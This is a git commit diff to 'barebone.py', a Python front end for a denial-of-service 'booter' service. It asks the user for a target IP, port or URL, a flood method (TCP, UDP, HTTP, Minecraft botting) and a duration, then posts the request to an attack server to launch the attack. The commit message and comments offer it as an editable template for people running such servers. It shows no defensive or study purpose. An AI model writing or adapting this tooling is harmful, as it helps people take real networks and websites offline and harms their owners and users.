c8d4ad2cde6c8155617fc87e0cd8270e41c840ff
freakyfdp-py <bypassfdp1501@gmail.com>
2025-05-05 21:37:16 +0200

    Updated barebone.py
    Now way easier to edit the messages and methods
    Already implement a *template* payload

--- barebone.py
+++ barebone.py
@@ -1,30 +1,42 @@
 import requests, os
 
-server_url = 'http://yourserver-thatlaunch.attacks'
+target_msg        = 'Please enter the ip:port ( http(s)://yoururl.com if HTTP Requests) of the target >> '
+time_msg          = 'Please enter for how many seconds you want the attack to stay >> '
+attack_method_msg = 'Enter your attack method >> '
+server_url        = 'http://yourserver:69'
 
 attack_mode = '''
 [1] TCP Flood           |
 [2] TCP Overload        |
 [3] UDP Flood           |
 [4] HTTP Requests       |
-[5] Minecraft Botting   |
-'''
+[5] Minecraft Botting   | 
+''' # Change the attack methods to the one you support
 
 try:
     while True:
         os.system('cls')
-        target = input('Please enter the ip:port ( https://yoururl.com if HTTP Requests) of the target >> ')
+        target = input(target_msg)
 
         print(attack_mode)
-        attack_method = input('Enter your attack method >> ')
+        attack_method = input(attack_method_msg)
         try:
-            time = int(input('Please enter for how many seconds you want the attack to stay >> '))
+            time = int(input(time_msg))
         except ValueError:
             time = 60
 
-        req = requests.post(server_url, json={'target': target, 'method': attack_method, 'time': time})
+        payload = { # PLEASE change the payload to one that your server supports
+            'target': target,
+            'method': attack_method,
+            'time': time
+        }
+
+        req = requests.post(server_url, json=payload)
+
         if req.status_code in [200, 204]: # You can also check if the req.json() contains a message your server returns
+            
             print('Launched attack successfully !')
+
             input('Press enter to continue...')
         else:
             print(f'[!] something bad happened: {req.text} - {req.status_code}')
